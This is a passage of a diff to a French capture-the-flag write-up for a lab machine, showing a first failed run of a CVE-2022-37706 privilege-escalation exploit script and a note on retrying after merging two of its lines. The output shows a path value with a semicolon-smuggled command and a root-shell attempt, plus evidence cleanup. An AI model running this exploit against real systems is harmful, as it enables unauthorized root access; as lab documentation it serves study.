@@ -757,7 +757,22 @@ rm -rf /tmp/net
 echo -e "Done; Everything is clear ;)"
 ```
 
-On exécute le CVE:
+On exécute le CVE, mais sans succès:
+```bash
+larissa@boardlight:~$ ./exploit.sh
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Welcome to the rabbit hole :)
+./exploit.sh: line 28: noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=1000,: command not found
+./exploit.sh: line 29: /dev/../tmp/;/tmp/exploit: Is a directory
+Press any key to clean the evedence...
+```
+
+
+On réessaye après avoir modifié la commande à la ligne 28 et 29 pour la mettre sur la même ligne:
 ```bash
 larissa@boardlight:~$ ./exploit.sh 
 CVE-2022-37706
